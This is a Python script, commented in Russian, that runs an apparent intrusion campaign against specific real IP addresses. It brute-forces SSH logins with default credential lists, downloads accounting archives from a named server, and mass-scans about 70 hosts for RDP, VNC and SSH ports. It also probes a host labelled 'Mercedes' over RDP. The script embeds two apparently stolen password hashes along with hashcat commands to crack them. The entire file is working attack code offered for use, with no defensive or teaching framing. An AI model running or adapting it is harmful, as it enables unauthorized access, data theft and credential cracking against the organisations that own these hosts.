import requests, urllib3, re, json, threading, time, socket, sys, os, subprocess
from urllib.parse import urljoin, urlparse
urllib3.disable_warnings()

print("=" * 60)
print("ПОЛНЫЙ АВТОМАТИЧЕСКИЙ ЧЕК ВСЕХ ЦЕЛЕЙ")
print("=" * 60)

# ============================================================
# 1. SSH BRUTE FORCE НА TOP ЦЕЛЯХ
# ============================================================
ssh_targets = [
    ("193.26.209.17", 22),
    ("185.143.145.146", 22),
    ("185.177.242.240", 65222),
    ("193.26.209.18", 22),
]

users = ["root", "admin", "user", "tech", "ubuntu", "debian", "centos", "font-unicode-corr", 
         "homeassistant", "mqtt", "iot", "pi", "oracle", "ec2-user", "azureuser", "gitlab", "jenkins"]

passwords = ["admin", "admin123", "password", "password123", "123456", "12345678", "root", "root123",
             "tech", "tech123", "Tech123", "ubuntu", "debian", "centos", "changeme", "changeme123",
             "welcome", "welcome123", "P@ssw0rd", "P@ssw0rd123", "Admin123!", "Root123!",
             "airid", "gitlab", "gitlab123", "voice", "voice01", "voice123", "r00tme",
             "font-unicode-corr", "homeassistant", "mqtt123", "iot123"]

print(f"\n[1/6] SSH BRUTE FORCE: {len(ssh_targets)} targets x {len(users)} users x {len(passwords)} passes")
print("-" * 60)

ssh_found = []
lock = threading.Lock()

def ssh_try(ip, port, user, pwd):
    try:
        import paramiko
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=user, password=pwd, timeout=5, banner_timeout=5, auth_timeout=5)
        with lock:
            ssh_found.append(f"{ip}:{port} -> {user}:{pwd}")
        ssh.close()
        return True
    except:
        return False

# Install paramiko if needed
try:
    import paramiko
except:
    print("Installing paramiko...")
    subprocess.run([sys.executable, "-m", "pip", "install", "paramiko", "-q"], capture_output=True)
    import paramiko

threads = []
for ip, port in ssh_targets:
    for user in users:
        for pwd in passwords:
            t = threading.Thread(target=ssh_try, args=(ip, port, user, pwd))
            t.start()
            threads.append(t)
            if len(threads) > 50:
                for t in threads: t.join(timeout=10)
                threads = []
            time.sleep(0.02)

for t in threads: t.join(timeout=30)

if ssh_found:
    print(f"\n[!!!] SSH CREDS FOUND ({len(ssh_found)}):")
    for f in ssh_found:
        print(f"    {f}")
else:
    print("\n[-] SSH creds not found in common lists")

# ============================================================
# 2. СКАЧИВАНИЕ ВСЕХ ZIP ИЗ CENTR_BUK
# ============================================================
print(f"\n[2/6] DOWNLOADING CENTR_BUK ZIP ARCHIVES")
print("-" * 60)

zip_list = [
    "check_00629133_10070_017_00000_000.zip",
    "check_00630040_10070_017.zip",
    "check_00629076_10070_017_00000_000.zip",
    "check_00206415_10070_024.zip",
    "check_00275245_10070_013.zip",
    "check_00629060_10070_017_00000_000.zip",
    "check_00201282_10070_024.zip",
    "check_00629080_10070_017_00000_000.zip",
    "check_00218201_10070_021.zip",
    "check_00629056_10070_017_00000_000.zip",
    "check_01033979_10070_014_00000_000.zip",
    "check_00537719_10070_004.zip",
    "check_00629121_10070_017_00000_000.zip",
    "check_00629049_10070_017_00000_000.zip",
    "check_00629134_10070_017_00000_000.zip",
    "check_00629048_10070_017.zip",
    "check_00242362_10070_009.zip",
    "check_00273709_10070_013.zip",
    "check_00218292_10070_021.zip",
    "check_00629082_10070_017_00000_000.zip",
    "check_00629084_10070_017_00000_000.zip",
    "check_00071936_10070_022.zip",
    "check_00629133_10070_017_00000_000.zip",
    "check_00208075_10070_021.zip",
    "pereoblik_10070_017_20260522.zip",
    "check_00536161_10070_004.zip",
    "check_00211089_10070_021.zip",
    "check_00626907_10070_017.zip",
    "zalyshky_10070_013_20260828.zip",
]

os.makedirs("centr_buk_zips", exist_ok=True)

for fname in zip_list:
    url = f"http://91.224.84.79:880/centr_buk/file/{fname}"
    try:
        r = requests.get(url, timeout=15, verify=False)
        if r.status_code == 200 and len(r.content) > 100:
            with open(f"centr_buk_zips/{fname}", "wb") as f:
                f.write(r.content)
            # Try to unzip and list
            result = subprocess.run(["unzip", "-l", f"centr_buk_zips/{fname}"], capture_output=True, text=True)
            print(f"  [+] {fname} ({len(r.content)} bytes) - {result.stdout.split(chr(10))[3].strip() if len(result.stdout.split(chr(10)))>3 else 'OK'}")
        else:
            print(f"  [-] {fname} - failed/empty")
    except Exception as e:
        print(f"  [-] {fname} - error: {e}")
    time.sleep(0.1)

# ============================================================
# 3. ПРОВЕРКА RDP/VNC ПОРТОВ НА ВСЕХ 60+ ХОСТАХ
# ============================================================
print(f"\n[3/6] RDP/VNC PORT SCAN ON ALL 60+ HOSTS")
print("-" * 60)

all_ips = [
    "80.96.108.86", "194.102.105.72", "80.96.113.146", "91.208.197.137",
    "194.44.109.106", "91.236.126.129", "193.150.49.19", "185.156.42.172",
    "213.111.86.192", "185.252.24.160", "185.143.145.146", "185.143.145.163",
    "193.23.53.131", "185.177.242.240", "134.249.151.95", "194.28.85.66",
    "185.156.42.96", "193.169.80.196", "194.36.80.3", "31.202.189.135",
    "139.28.39.162", "178.219.195.155", "95.158.50.101", "46.201.255.215",
    "195.226.192.139", "213.169.74.78", "31.43.60.67", "217.20.172.245",
    "31.43.159.185", "31.131.31.19", "85.223.221.130", "91.225.224.30",
    "185.20.218.111", "185.20.218.146", "185.20.218.145", "178.93.54.13",
    "91.240.98.105", "82.207.46.61", "195.211.84.128", "193.26.209.18",
    "193.26.209.16", "193.26.209.17", "195.39.248.243", "5.153.182.40",
    "176.119.26.15", "93.171.129.194", "176.97.112.234", "62.182.81.165",
    "62.182.81.153", "62.182.81.135", "176.37.127.243", "5.188.6.30",
    "185.225.226.44", "62.182.86.143", "185.237.106.167", "146.0.81.115",
    "31.148.168.97", "31.148.168.22", "31.148.168.21", "31.148.168.27",
    "31.148.168.26", "31.148.168.24", "31.148.168.16", "31.148.168.17",
    "31.148.168.15", "31.148.168.12", "31.148.168.13", "31.148.168.65",
    "46.172.90.123", "46.172.90.125", "91.145.240.23", "185.25.119.163",
]

rdp_ports = [3389, 3390, 3393, 3990, 3994, 49389, 50005, 50500, 56391, 65333, 27100, 2843, 33399, 3478, 50555]
vnc_ports = [5900, 5901, 5902, 5903, 5487, 5488, 59001, 59002, 59003, 59005, 59056, 59075, 5901, 5902]
ssh_ports = [22, 2222, 35022, 36022, 55476, 65222, 2022, 8022, 8023, 765, 22510, 50500, 2846, 50555]

open_ports_all = []
lock = threading.Lock()

def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0:
            with lock:
                open_ports_all.append(f"{ip}:{port}")
        return result == 0
    except:
        return False

threads = []
for ip in all_ips:
    for port in rdp_ports + vnc_ports + ssh_ports:
        t = threading.Thread(target=scan_port, args=(ip, port))
        t.start()
        threads.append(t)
        if len(threads) > 300:
            for t in threads: t.join(timeout=5)
            threads = []
        time.sleep(0.005)

for t in threads: t.join(timeout=30)

# Group by IP
by_ip = {}
for entry in open_ports_all:
    ip, port = entry.split(":")
    if ip not in by_ip:
        by_ip[ip] = []
    by_ip[ip].append(int(port))

print(f"\n[!!!] OPEN PORTS FOUND ON {len(by_ip)} HOSTS:")
for ip in sorted(by_ip.keys(), key=lambda x: len(by_ip[x]), reverse=True):
    ports_str = ", ".join(map(str, sorted(by_ip[ip])))
    print(f"  {ip}: {ports_str}")

# ============================================================
# 4. ПРОВЕРКА VNC НА 193.26.209.17 (6 ПОРТОВ) - noVNC/WEB
# ============================================================
print(f"\n[4/6] CHECKING VNC WEB INTERFACES ON 193.26.209.17")
print("-" * 60)

vnc_ports_17 = [59001, 59002, 59003, 59005, 59056, 59075]
for port in vnc_ports_17:
    try:
        r = requests.get(f"http://193.26.209.17:{port}/", timeout=5, verify=False)
        print(f"  193.26.209.17:{port} - HTTP {r.status_code} ({len(r.text)} bytes)")
        if "noVNC" in r.text or "vnc" in r.text.lower() or "RFB" in r.text:
            print(f"    [!!!] VNC WEB INTERFACE DETECTED!")
    except Exception as e:
        print(f"  193.26.209.17:{port} - {e}")

# ============================================================
# 5. ПРОВЕРКА MERCEDES RDP (193.27.80.140:3389)
# ============================================================
print(f"\n[5/6] CHECKING MERCEDES RDP (193.27.80.140:3389)")
print("-" * 60)
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    result = sock.connect_ex(("193.27.80.140", 3389))
    sock.close()
    if result == 0:
        print("  [!!!] RDP 3389 OPEN on Mercedes host")
        # Try to get RDP banner
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect(("193.27.80.140", 3389))
        sock.send(b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x12\x34\x00\x02\x01\x08\x00\x02\x00\x00\x00")
        data = sock.recv(1024)
        sock.close()
        print(f"  RDP banner: {data.hex()[:100]}")
    else:
        print("  RDP closed/filtered")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
# 6. HASHCAT PREP ДЛЯ AIRID ХЕШЕЙ
# ============================================================
print(f"\n[6/6] HASHCAT PREP FOR AIRID HASHES")
print("-" * 60)

hashes = {
    "root": "$6$s68oupmjEmqlpEnr$669izkP3Git/KEOBFfRefAGHqPtgBQWBe.r3o6cu4EF9udQJ8a6fR2B0/JFzbVFVoAYkaL1oiZN7YBq/0WUnS/",
    "tech": "$6$C2rG/DOQ/iwjf63b$.9igs85HZprPNli2kC/0niWR0pvCsM6OqJIunerlltxrq81uJ9A2OOy2ysFPtumAX7K.3u27a7s5Uz4l8MC8W1"
}

with open("airid_hashes.hashcat", "w") as f:
    for user, h in hashes.items():
        f.write(f"{user}:{h}\n")

print("  Created airid_hashes.hashcat:")
with open("airid_hashes.hashcat") as f:
    print(f"  {f.read().strip()}")

print("\n  Hashcat command:")
print("  hashcat -m 1800 -a 0 airid_hashes.hashcat rockyou.txt")
print("  hashcat -m 1800 -a 3 airid_hashes.hashcat ?a?a?a?a?a?a?a?a")

print("\n" + "=" * 60)
print("ПОЛНЫЙ ЧЕК ЗАВЕРШЁН")
print("=" * 60)
